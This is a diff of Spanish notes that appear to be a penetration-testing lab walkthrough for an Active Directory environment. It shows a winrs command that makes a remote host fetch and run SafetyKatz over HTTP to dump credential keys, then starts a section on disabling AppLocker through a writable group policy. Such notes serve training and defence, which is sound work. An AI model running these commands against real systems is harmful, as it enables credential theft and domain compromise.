@@ -341,4 +341,9 @@ Una vez hemos cargado el archivo extraeremos las credenciales usando
 winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
 ```
 
-Antes de pod
+Antes de poder ejecutar este comando tendremos que tener abierto el *HSF* y tener cargado en el el *SafetyKatz*
+
+Una vez ejecutemos el comando entrara la ejecución de *SefetyKatz* con las credenciales de los usuarios
+
+### Deshabilitar Applocker modificando la GPO de *adminsrv*
+Como hemos enumerado anteriormente el usuario *student97* tiene control total en la política de grupo *AppLocker* pudiendo realizar cambios en la política de grupo y poder deshabilitar esta
